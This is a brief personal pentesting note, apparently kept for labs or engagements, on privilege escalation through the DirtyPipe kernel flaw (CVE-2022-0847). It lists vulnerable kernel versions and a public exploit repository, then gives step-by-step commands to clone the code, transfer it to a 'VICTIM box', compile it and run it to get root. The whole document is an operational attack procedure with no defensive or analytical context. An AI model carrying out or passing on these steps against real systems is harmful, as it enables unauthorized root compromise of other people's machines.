Note: GCC must be present on victim box before trying

Requirements
	Linux Kernel 5.8 < 5.16.11
	i also notice it is usually ubuntu <= 20.04

https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

Usage:
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
	already here:
	/home/kali/tools/kernel_exploits/CVE-2022-0847-DirtyPipe-Exploits


Transfer all files to VICTIM box

chmod +x compile.sh
./compile.sh

./exploit-1
	you are now root
```